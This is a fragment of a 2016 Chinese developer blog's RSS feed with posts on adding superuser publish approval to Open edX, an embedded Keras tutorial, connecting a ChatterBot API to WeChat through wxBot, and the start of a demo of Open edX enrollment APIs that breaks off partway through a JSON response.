                "var VARIANT = MathJax.OutputJax.SVG.FONTDATA.VARIANT;" +
                "VARIANT['normal'].fonts.unshift('MathJax_default');" +
                "VARIANT['bold'].fonts.unshift('MathJax_default-bold');" +
                "VARIANT['italic'].fonts.unshift('MathJax_default-italic');" +
                "VARIANT['-tex-mathit'].fonts.unshift('MathJax_default-italic');" +
            "});" +
        "}";
    (document.body || document.getElementsByTagName('head')[0]).appendChild(mathjaxscript);
}
&lt;/script&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Tue, 23 Aug 2016 00:00:00 +0000</pubDate><guid>tag:,2016-08-23:Entropy.html</guid><category>data</category></item><item><title>为open-edx构建审核系统</title><link>/edx-check-publish.html</link><description>&lt;h1&gt;目的&lt;/h1&gt;
&lt;p&gt;审核人员审核通过才予以发布，粒度细到每一&lt;code&gt;单元&lt;/code&gt; （章-&amp;gt;节-&amp;gt;单元）&lt;/p&gt;
&lt;h1&gt;思路&lt;/h1&gt;
&lt;p&gt;构建审核系统的核心是构建权限系统，将审核系统视为权限系统的一个应用（上下层关系）&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;利用django的权限系统,参考&lt;a href="https://wizardforcel.gitbooks.io/django-book-20-zh-cn/content/14.html"&gt;djangobook:会话、用户和注册&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;构建用户组，可实现不同粒度的权限系统（审核只是权限系统的一个应用）&lt;ul&gt;
&lt;li&gt;django admin可以增删改用户/用户组&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;把用户组与课程关联&lt;ul&gt;
&lt;li&gt;构建出院系/部分之类的逻辑关系&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;简单地利用既有的is_staff/is_superuser构建全局的权限系统&lt;ul&gt;
&lt;li&gt;利用is_staff可以构建出课程级别的审核权限（全局审核员，将课程审核员添加为对应课程的团队成员）&lt;ul&gt;
&lt;li&gt;代价，可能会损失is_staff本身的特性，比如studio本可以将其用于教师身份审核机制（当然这个特性默认不启用）&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;简易实现&lt;/h1&gt;
&lt;p&gt;我们先实现&lt;code&gt;全局的权限系统&lt;/code&gt;,superuser拥有全局的审核权限，每一个章节的发布都需要superuser的审核&lt;/p&gt;
&lt;h3&gt;特性描述&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;superuser是网站全站管理员，可以增删其他&lt;code&gt;superuser&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;每一个章节的发布都需要superuser的审核通过&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;技术实现&lt;/h3&gt;
&lt;p&gt;我们可以直接以发布按钮作为切入点：&lt;/p&gt;
&lt;p&gt;&lt;img alt="" src="http://oav6fgfj1.bkt.clouddn.com/publish77ab6185.png" /&gt;&lt;/p&gt;
&lt;p&gt;具体的想法是，&lt;code&gt;发布&lt;/code&gt;按钮改为&lt;code&gt;审核通过&lt;/code&gt;按钮，只有superuser对其可见/可操作。&lt;/p&gt;
&lt;p&gt;使用浏览器调试工具，锁定元素（action-publish），跟踪到&lt;a href="https://github.com/edx/edx-platform/blob/master/cms/templates/js/publish-xblock.underscore#L113"&gt;publish-xblock.underscore&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;我们现在需要在目标元素（主要是&lt;code&gt;发布&lt;/code&gt;按钮）前后一个逻辑判断，仅当用户是superuser时才予以展示（潜在风险是后台其实没做验证，暂不论）&lt;/p&gt;
&lt;p&gt;往细里说，我们只需要往这个文件中传递&lt;code&gt;request.user.is_superuser&lt;/code&gt;参数，便可得知当前用户是否是superuser。&lt;/p&gt;
&lt;p&gt;问题装化为如何往当前文件(publish-xblock.underscore) 传递变量&lt;/p&gt;
&lt;p&gt;我们发现&lt;code&gt;publish-xblock.underscore&lt;/code&gt;由&lt;a href="https://github.com/edx/edx-platform/blob/master/cms/static/js/views/pages/container_subviews.js#L89"&gt;container_subviews.js&lt;/a&gt;加载&lt;/p&gt;
&lt;p&gt;这是一个枢纽。我们可以跟踪&lt;a href="https://github.com/edx/edx-platform/blob/master/cms/static/js/views/pages/container_subviews.js#L112"&gt;publishedBy&lt;/a&gt;变量，它关联到后端变量&lt;a href="https://github.com/edx/edx-platform/blob/master/cms/djangoapps/contentstore/views/item.py#L1063"&gt;published_by&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;在此注入变量便可&lt;/p&gt;
&lt;h3&gt;开发调试&lt;/h3&gt;
&lt;p&gt;在devstack中编辑cms/static/js/views/pages/container_subviews.js即使生效&lt;/p&gt;
&lt;h1&gt;提醒&lt;/h1&gt;
&lt;p&gt;不要忘了编辑静态文件后，用paver编译一下&lt;/p&gt;
&lt;h1&gt;遗留问题&lt;/h1&gt;
&lt;p&gt;能否在js里直接写 &lt;code&gt;${ request.user.username }&lt;/code&gt; &lt;/p&gt;
&lt;h3&gt;实验结果&lt;/h3&gt;
&lt;p&gt;不能在&lt;code&gt;cms/static/js/views/pages/container_subviews.js&lt;/code&gt;中写&lt;code&gt;${ request.user.username }&lt;/code&gt;,只有混杂在html中的js才会被当模板渲染&lt;/p&gt;
&lt;p&gt;可以通过传参的的机制实现，不过实现起来比较棘手，&lt;/p&gt;
&lt;p&gt;可以直接写html使按钮隐藏，同时在后台验证用户是够是超级用户：具体修改&lt;a href="https://github.com/edx/edx-platform/blob/master/cms/djangoapps/contentstore/views/item.py#L585"&gt;_save_xblock&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;把:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;        &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;publish&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;make_public&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
            &lt;span class="n"&gt;modulestore&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;publish&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;xblock&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;location&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;user&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;id&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;改为&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;        &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;publish&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;make_public&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
            &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;user&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;is_superuser&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
                &lt;span class="n"&gt;modulestore&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;publish&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;xblock&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;location&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;user&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;id&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;如此一来。普通教师可以编写课程内容，却无法发布。而超级用户可以点击发布，在超级用户视角下，所有可点击状态的发布按钮，都编码当前内容有修改，待发布&lt;/p&gt;
&lt;h1&gt;结论&lt;/h1&gt;
&lt;p&gt;搞定！&lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Tue, 23 Aug 2016 00:00:00 +0000</pubDate><guid>tag:,2016-08-23:edx-check-publish.html</guid><category>edx</category></item><item><title>[译]神经网络的"Hello world" --keras 入门</title><link>/keras-hello-world-pelican.html</link><description>&lt;h1&gt;本文写作说明&lt;/h1&gt;
&lt;p&gt;本文在jupyter notebook中写作，因为博客使用pelican构建，于是我将ipynb导出为html(单个文件)，然后放到博客的output里，用&lt;code&gt;&amp;lt;iframe&amp;gt;&lt;/code&gt;链入博客主体&lt;/p&gt;
&lt;p&gt;当然你也可以直接在github上读：&lt;a href="https://github.com/wwj718/keras-hello-world/blob/master/kerashelloworld_zh.ipynb"&gt;wwj718/keras-hello-world&lt;/a&gt;&lt;/p&gt;
&lt;h1&gt;正文&lt;/h1&gt;
&lt;p&gt;&lt;iframe src="/others/keras-hello-world.html" width="100%" height="8000px" marginwidth="0" marginheight="0" frameborder="0" scrolling="no"&gt;You need an iFrame capable browser to view this.&lt;/iframe&gt;&lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Sat, 20 Aug 2016 00:00:00 +0000</pubDate><guid>tag:,2016-08-20:keras-hello-world-pelican.html</guid><category>data</category></item><item><title>把聊天机器人接入微信</title><link>/create-wechat-bot.html</link><description>&lt;p&gt;今晚看了个电影，回得有点迟。上周末写了一篇&lt;a href="http://blog.just4fun.site/create-a-smart-chat-bot.html"&gt;构建自己的智能聊天机器人&lt;/a&gt;。在微博中被一位技术大V转载，而后博客访问量陡增，之后又被微信一个机器学习的公众号转载，大家似乎很感兴趣，为了对得起增长的访问流量，趁热再写些东西&lt;/p&gt;
&lt;p&gt;今天分享如何把聊天机器人接入微信，代替我们和好友聊天&lt;/p&gt;
&lt;p&gt;源码我已经托管到github：&lt;a href="https://github.com/wwj718/wechat_bot"&gt;wechat_bot&lt;/a&gt;&lt;/p&gt;
&lt;h1&gt;机器人的api接口&lt;/h1&gt;
&lt;p&gt;首先我们决定把聊天机器人封装为api服务，这样它的使用场合就不受限制了，能服务于任何http client&lt;/p&gt;
&lt;p&gt;这样做的另一个原因是，我们的微信接入脚本是python2的，而中文聊天机器人脚本基于python3，我不想处理pyhton2/3的编码，所以把机器人封装为服务&lt;/p&gt;
&lt;p&gt;阅读下文前，假设你读过我的上篇文章&lt;a href="http://blog.just4fun.site/create-a-smart-chat-bot.html"&gt;构建自己的智能聊天机器人&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;我们直接开始构建聊天服务.&lt;/p&gt;
&lt;p&gt;创建&lt;code&gt;bot_api.py&lt;/code&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="ch"&gt;#!/usr/bin/env python&lt;/span&gt;
&lt;span class="c1"&gt;# coding: utf-8&lt;/span&gt;

&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;chatterbot&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;ChatBot&lt;/span&gt;
&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;chatterbot.trainers&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;ChatterBotCorpusTrainer&lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;hug&lt;/span&gt;


&lt;span class="n"&gt;deepThought&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;ChatBot&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;deepThought&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="n"&gt;deepThought&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;set_trainer&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;ChatterBotCorpusTrainer&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="c1"&gt;# 使用中文语料库训练它&lt;/span&gt;
&lt;span class="n"&gt;deepThought&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;train&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;chatterbot.corpus.chinese&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;  &lt;span class="c1"&gt;# 语料库&lt;/span&gt;


&lt;span class="nd"&gt;@hug.get&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;get_response&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;user_input&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
    &lt;span class="n"&gt;response&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;deepThought&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;get_response&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;user_input&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;text&lt;/span&gt;
    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;response&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="n"&gt;response&lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;源码十分简单，不必多做解释&lt;/p&gt;
&lt;p&gt;在此我选择&lt;a href="https://github.com/timothycrosley/hug"&gt;hug&lt;/a&gt;作为我的api框架，原因是它的效率很高（比flask还高不少）。&lt;/p&gt;
&lt;p&gt;&lt;img alt="" src="http://oav6fgfj1.bkt.clouddn.com/hug16201c01.png" /&gt;&lt;/p&gt;
&lt;p&gt;安装依赖：pip3 install hug ，chatterbot的安装方法参考上篇文章&lt;/p&gt;
&lt;p&gt;跑起服务：&lt;code&gt;hug -f bot_api.py&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img alt="" src="http://oav6fgfj1.bkt.clouddn.com/hug0e6e17ad.png" /&gt;&lt;/p&gt;
&lt;h3&gt;测试服务&lt;/h3&gt;
&lt;p&gt;在浏览器中测试&lt;/p&gt;
&lt;p&gt;&lt;img alt="" src="http://oav6fgfj1.bkt.clouddn.com/hug336b216d.png" /&gt;&lt;/p&gt;
&lt;h1&gt;接入微信&lt;/h1&gt;
&lt;p&gt;首先感谢@liuwons的&lt;a href="https://github.com/liuwons/wxBot"&gt;wxBot&lt;/a&gt;项目，它让我们能用代码与微信交互，这样一来使聊天过程（input/output）可编程了&lt;/p&gt;
&lt;p&gt;于是我们可以让聊天机器人接管我们的聊天。&lt;/p&gt;
&lt;h3&gt;操作过程&lt;/h3&gt;
&lt;p&gt;首先下载wxBot脚本到本地：&lt;code&gt;wget https://raw.githubusercontent.com/liuwons/wxBot/master/wxbot.py&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;接着创建&lt;code&gt;wechat_bot.py&lt;/code&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="ch"&gt;#!/usr/bin/env python&lt;/span&gt;
&lt;span class="c1"&gt;# coding: utf-8&lt;/span&gt;

&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;wxbot&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;WXBot&lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;requests&lt;/span&gt;
&lt;span class="n"&gt;bot_api&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;http://127.0.0.1:8000/get_response&amp;quot;&lt;/span&gt;

&lt;span class="k"&gt;class&lt;/span&gt; &lt;span class="nc"&gt;MyWXBot&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;WXBot&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;handle_msg_all&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;msg&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
        &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;msg&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;msg_type_id&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="mi"&gt;4&lt;/span&gt; &lt;span class="ow"&gt;and&lt;/span&gt; &lt;span class="n"&gt;msg&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;content&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;][&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;type&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
            &lt;span class="n"&gt;user_input&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;msg&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;content&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;][&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;data&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
            &lt;span class="n"&gt;payload&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;user_input&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="n"&gt;user_input&lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt;
            &lt;span class="n"&gt;response&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;requests&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;get&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;bot_api&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;params&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;payload&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;json&lt;/span&gt;&lt;span class="p"&gt;()[&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;response&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
            &lt;span class="c1"&gt;#print(type(response)) # unicode&lt;/span&gt;
            &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;send_msg_by_uid&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;response&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;msg&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;user&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;][&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;id&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt;

&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;main&lt;/span&gt;&lt;span class="p"&gt;():&lt;/span&gt;
    &lt;span class="n"&gt;bot&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;MyWXBot&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
    &lt;span class="n"&gt;bot&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;DEBUG&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="bp"&gt;True&lt;/span&gt;
    &lt;span class="n"&gt;bot&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;conf&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;qr&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;png&amp;#39;&lt;/span&gt;
    &lt;span class="n"&gt;bot&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;run&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;

&lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;__name__&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;__main__&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
    &lt;span class="n"&gt;main&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;安装依赖：&lt;code&gt;pip install requests pyqrcode pypng Pillow&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;开始运行(使用python2)：&lt;code&gt;python wechat_bot.py&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;之后扫码登录即可&lt;/p&gt;
&lt;h1&gt;开始聊天&lt;/h1&gt;
&lt;p&gt;这是程序收到的消息
&lt;img alt="" src="http://oav6fgfj1.bkt.clouddn.com/botaed8c5a1.png" /&gt;&lt;/p&gt;
&lt;p&gt;这是被机器人接管的聊天界面&lt;/p&gt;
&lt;p&gt;&lt;img alt="" src="http://oav6fgfj1.bkt.clouddn.com/wechat_bot6055328f.png" /&gt;&lt;/p&gt;
&lt;p&gt;感谢小伙伴半夜出出镜助攻，哈哈码农都是夜猫子&lt;/p&gt;
&lt;p&gt;have a good time&lt;/p&gt;
&lt;p&gt;啊 写完都半夜了，赶紧睡觉&lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Tue, 16 Aug 2016 00:00:00 +0000</pubDate><guid>tag:,2016-08-16:create-wechat-bot.html</guid><category>data</category></item><item><title>为Open edX移动端实现选课功能</title><link>/edx-mobile-enrollment.html</link><description>&lt;p&gt;Open edX移动端进展缓慢，几个月前的坑也不见填好。&lt;/p&gt;
&lt;p&gt;现有的后台接口已经满足选课要求了,移动端还没更上，只能自己动手丰衣足食了，在此演示如何使用这些接口实现选课功能（使用工具&lt;a href="https://github.com/jkbrzt/httpie"&gt;httpie&lt;/a&gt;（把它理解为一个更先进的curl就行）做演示）&lt;/p&gt;
&lt;h3&gt;列出所有课程&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;http http://LMS_HOST/api/courses/v1/courses/&lt;/code&gt;&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;quot;pagination&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
        &lt;span class="nt"&gt;&amp;quot;count&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mi"&gt;46&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
        &lt;span class="nt"&gt;&amp;quot;next&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;http://LMS_HOST/api/courses/v1/courses/?page=2&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
        &lt;span class="nt"&gt;&amp;quot;num_pages&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mi"&gt;5&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
        &lt;span class="nt"&gt;&amp;quot;previous&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="kc"&gt;null&lt;/span&gt;
    &lt;span class="p"&gt;},&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;quot;results&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;
        &lt;span class="p"&gt;{&lt;/span&gt;
            &lt;span class="nt"&gt;&amp;quot;blocks_url&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;http://LMS_HOST/api/courses/v1/blocks/?course_id=course-v1%3test%2Btest%2Btest&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
            &lt;span class="nt"&gt;&amp;quot;course_id&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;course-v1:test+test+test&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
            &lt;span class="nt"&gt;&amp;quot;effort&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="kc"&gt;null&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
            &lt;span class="nt"&gt;&amp;quot;end&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;2016-09-29T16:00:00Z&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
            &lt;span class="nt"&gt;&amp;quot;enrollment_end&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="kc"&gt;null&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
            &lt;span class="nt"&gt;&amp;quot;enrollment_start&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="kc"&gt;null&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
            &lt;span class="nt"&gt;&amp;quot;media&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
                &lt;span class="nt"&gt;&amp;quot;course_image&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
                    &lt;span class="nt"&gt;&amp;quot;uri&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;/asset-v1:test+test+test+type@asset+block@logo.jpg&amp;quot;&lt;/span&gt;
                &lt;span class="p"&gt;},&lt;/span&gt;
                &lt;span class="nt"&gt;&amp;quot;course_video&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
                    &lt;span class="nt"&gt;&amp;quot;uri&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="kc"&gt;null&lt;/span&gt;
                &lt;span class="p"&gt;}&lt;/span&gt;
            &lt;span class="p"&gt;},&lt;/span&gt;
            &lt;span class="nt"&gt;&amp;quot;name&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;test&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
            &lt;span class="nt"&gt;&amp;quot;number&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;test&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
            &lt;span class="nt"&gt;&amp;quot;org&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;test&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
            &lt;span class="nt"&gt;&amp;quot;short_description&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;test&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
            &lt;span class="nt"&gt;&amp;quot;start&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;2016-02-01T00:00:00Z&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
